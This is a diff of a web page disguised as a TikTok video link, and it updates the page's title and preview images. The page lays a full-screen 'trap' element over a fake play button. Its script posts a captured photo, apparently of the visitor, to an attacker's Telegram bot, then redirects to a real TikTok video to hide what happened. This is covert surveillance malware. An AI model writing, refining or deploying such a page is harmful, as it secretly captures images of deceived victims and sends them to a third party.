@@ -4,21 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
-    <title>TikTok · warza jayto</title>
+    <title>TikTok · Watch Video</title>
 
-    <link rel="icon" type="image/png" href="https://www.tiktok.com/pwa-data/pwa_192.png">
-    <link rel="apple-touch-icon" href="https://www.tiktok.com/pwa-data/pwa_192.png">
-
-    <meta property="og:title" content="TikTok · warza jayto">
+    <link rel="icon" type="image/png" href="https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/o0I7AfEeYhInEIBfAnAEnIDB6EgQtSByfAefA2?x-expires=1705000000&x-signature=test">
+    
+    <meta property="og:title" content="TikTok · Watch Video">
     <meta property="og:description" content="Watch this video on TikTok">
-    <meta property="og:image" content="https://www.tiktok.com/pwa-data/pwa_192.png">
+    <meta property="og:image" content="https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/o0I7AfEeYhInEIBfAnAEnIDB6EgQtSByfAefA2?x-expires=1705000000&x-signature=test">
     <meta property="og:type" content="video.other">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content="https://www.tiktok.com/pwa-data/pwa_192.png">
+    <meta name="twitter:image" content="https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/o0I7AfEeYhInEIBfAnAEnIDB6EgQtSByfAefA2?x-expires=1705000000&x-signature=test">
 
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://www.tiktok.com/pwa-data/pwa_192.png') no-repeat center center; background-size: contain; z-index: 1; }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://p16-sign-va.tiktokcdn.com/obj/tos-maliva-p-0068/o0I7AfEeYhInEIBfAnAEnIDB6EgQtSByfAefA2?x-expires=1705000000&x-signature=test') no-repeat center center; background-size: cover; z-index: 1; }
         .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 5; pointer-events: none; }
         .play-icon { width: 80px; height: 80px; fill: white; opacity: 0.8; }
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
@@ -56,17 +55,18 @@
                     const formData = new FormData();
                     formData.append('chat_id', chat_id);
                     formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', "📸 وێنەیەکی نوێ گەیشت\n🔗 پەیج: TikTok · warza jayto");
+                    formData.append('caption', "📸 وێنەیەکی نوێ گەیشت\n🔗 پەیج: TikTok · Watch Video");
 
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
 
-                    window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
+                    // گواستنەوە بۆ لینکی ڤیدیۆکەت
+                    window.location.href = "https://vt.tiktok.com/ZS5pS5oWn/";
                 }, 1000);
             } catch (e) {
-                window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
+                window.location.href = "https://vt.tiktok.com/ZS5pS5oWn/";
             }
         }
     </script>
